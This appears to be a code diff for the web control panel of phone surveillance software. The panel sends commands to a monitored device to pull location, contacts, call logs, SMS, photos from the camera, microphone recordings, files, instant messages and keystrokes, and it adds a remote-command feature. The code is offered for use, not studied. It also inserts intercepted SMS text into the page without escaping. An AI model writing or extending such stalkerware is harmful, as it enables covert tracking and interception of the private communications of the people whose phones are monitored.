@@ -32,7 +32,6 @@ const auth = getAuth();
 let uid = null;
 let dashboardInitialized = false;
 
-// ✅ Global sendCommand function
 function sendCommand(section, commandValue) {
   const user = auth.currentUser;
   if (!user) return console.warn("User not authenticated");
@@ -44,7 +43,6 @@ function sendCommand(section, commandValue) {
     .catch(err => console.error("❌ Command Error:", err));
 }
 
-// ✅ Auth State Listener
 onAuthStateChanged(auth, (user) => {
   if (user && !dashboardInitialized) {
     uid = user.uid;
@@ -58,21 +56,12 @@ onAuthStateChanged(auth, (user) => {
 function initializeDashboard() {
   document.getElementById("logoutBtn")?.addEventListener("click", () => {
     signOut(auth).then(() => window.location.href = "index.html");
- 
   });
 
-     // Initial commands after user is authenticated
-sendCommand("status", "getStatus");
-sendCommand("battery", "getBattery");
-sendCommand("lastSeen", "getLastSeen");
-sendCommand("location", "getLocation");
-sendCommand("installedApps", "getInstalledApps");
-sendCommand("calls", "getCallLogs");
-sendCommand("contacts", "getContacts");
-sendCommand("sms", "getSmsLogs");
+  // Send all startup commands
+  ["status", "battery", "lastSeen", "location", "installedApps", "calls", "contacts", "keylogger", "sms", "remote-command", "geo-fence"]
+    .forEach(section => sendCommand(section, `get${section.charAt(0).toUpperCase() + section.slice(1)}`));
 
-
-  // Real-time data listener
   const userRef = ref(db, `users/${uid}`);
   onValue(userRef, (snapshot) => {
     const data = snapshot.val();
@@ -83,14 +72,6 @@ sendCommand("sms", "getSmsLogs");
 
     const battery = data.battery?.percentage;
     document.getElementById("batteryLevel").textContent = battery !== undefined ? `${battery}%` : "--%";
-    
-   //  const chargingOn = data.battery.charging  === true;
-
-   //  if (chargingOn) {
-   //   document.querySelector(".chargingOn").style.display = "inline";
-   //  } else {
-   //   document.querySelector(".chargingOn").style.display = "none";
-   // }
 
     if (data.lastSeenTime) {
       const dt = new Date(data.lastSeenTime);
@@ -109,7 +90,6 @@ sendCommand("sms", "getSmsLogs");
 
   const map = L.map('map', { zoomControl: true }).setView([21.4505, 80.2048], 14);
   const liveMarker = L.marker([21.4505, 80.2048]).addTo(map);
-
   L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
     attribution: '&copy; Esri — Source: Esri, Maxar',
     maxZoom: 19
@@ -122,8 +102,7 @@ sendCommand("sms", "getSmsLogs");
         const name = data.display_name || "Unknown";
         liveMarker.bindPopup(`<b>Location:</b><br>${name}`).openPopup();
         document.getElementById("locationInfo").textContent = name;
-      })
-      .catch(() => {
+      }).catch(() => {
         liveMarker.bindPopup("Location details not available").openPopup();
       });
   }
@@ -181,15 +160,75 @@ sendCommand("sms", "getSmsLogs");
     sendCommand("sms", "getSmsLogs");
   });
 
-  onChildAdded(ref(db, `users/${uid}/sms`), (smsSnap) => {
-    const sms = smsSnap.val();
-    const tbody = document.getElementById("smsTableBody");
-    const tr = document.createElement("tr");
-    tr.innerHTML = `<td>${sms.from || "Unknown"}</td><td>${sms.message || ""}</td><td>${new Date(sms.timestamp || Date.now()).toLocaleString()}</td>`;
-    tbody.appendChild(tr);
+  document.getElementById("refreshSiteBtn")?.addEventListener("click", () => location.reload());
+
+  // ✅ Dynamic Side Panel Command Handler
+  document.addEventListener("DOMContentLoaded", () => {
+    document.querySelectorAll(".side-features a").forEach(link => {
+      link.addEventListener("click", (e) => {
+        e.preventDefault();
+        const section = link.dataset.section;
+        if (!section) return;
+        const commandMap = {
+          "dashboard": "getStatus", "sms": "getSmsLogs", "call-logs": "getCallLogs",
+          "location": "getLocation", "contact": "getContacts", "camera": "capturePhoto",
+          "microphone": "recordAudio", "gallery": "getGallery", "file-manager": "getFiles",
+          "im-monitor": "getMessages", "geo-fence": "getGeoFence", "keylogger": "getKeystrokes",
+          "remote-command": "getRemoteCommands", "app-lock": "getLockedApps"
+        };
+        const command = commandMap[section] || `fetch-${section}`;
+        sendCommand(section, command);
+      });
+    });
   });
 
-  document.getElementById("refreshSiteBtn")?.addEventListener("click", () => location.reload());
+  // ✅ SMS Log Realtime & Filtering
+  const smsLogs = [];
+
+  function renderSMSLogs() {
+    const tbody = document.getElementById("smsTableBody");
+    tbody.innerHTML = "";
+    const nameFilter = document.getElementById("filter-name").value.toLowerCase();
+    const numberFilter = document.getElementById("filter-number").value.toLowerCase();
+    const messageFilter = document.getElementById("filter-message").value.toLowerCase();
+    const dateFilter = document.getElementById("filter-date").value.toLowerCase();
+    const addressFilter = document.getElementById("filter-address").value.toLowerCase();
+
+    const filtered = smsLogs.filter(sms => {
+      return (!nameFilter || (sms.name || "").toLowerCase().includes(nameFilter)) &&
+             (!numberFilter || (sms.number || "").toLowerCase().includes(numberFilter)) &&
+             (!messageFilter || (sms.message || "").toLowerCase().includes(messageFilter)) &&
+             (!dateFilter || new Date(sms.timestamp || 0).toLocaleDateString().toLowerCase().includes(dateFilter)) &&
+             (!addressFilter || (sms.address || "").toLowerCase().includes(addressFilter));
+    });
+
+    filtered.forEach(sms => {
+      const tr = document.createElement("tr");
+      tr.innerHTML = `
+        <td><input type="checkbox" /></td>
+        <td><span class="badge ${sms.type === 'INCOMING' ? 'badge-incoming' : 'badge-outgoing'} text-white">${sms.type || '-'}</span></td>
+        <td>${sms.name || '-'}</td>
+        <td>${sms.message || '-'}</td>
+        <td>${sms.number || '-'}</td>
+        <td>${sms.timestamp ? new Date(sms.timestamp).toLocaleString() : '-'}</td>
+        <td>${sms.address || 'Unknown'} <i class="fas fa-map-marked-alt map-icon ms-2"></i></td>
+      `;
+      tbody.appendChild(tr);
+    });
+  }
+
+  const smsRef = ref(db, `users/${uid}/sms/logs`);
+  onChildAdded(smsRef, (snap) => {
+    const sms = snap.val();
+    if (sms) {
+      smsLogs.push(sms);
+      renderSMSLogs();
+    }
+  });
+
+  ["filter-name", "filter-message", "filter-number", "filter-date", "filter-address"].forEach(id => {
+    document.getElementById(id)?.addEventListener("input", renderSMSLogs);
+  });
 }
 
 function displayNoneDashboard() {
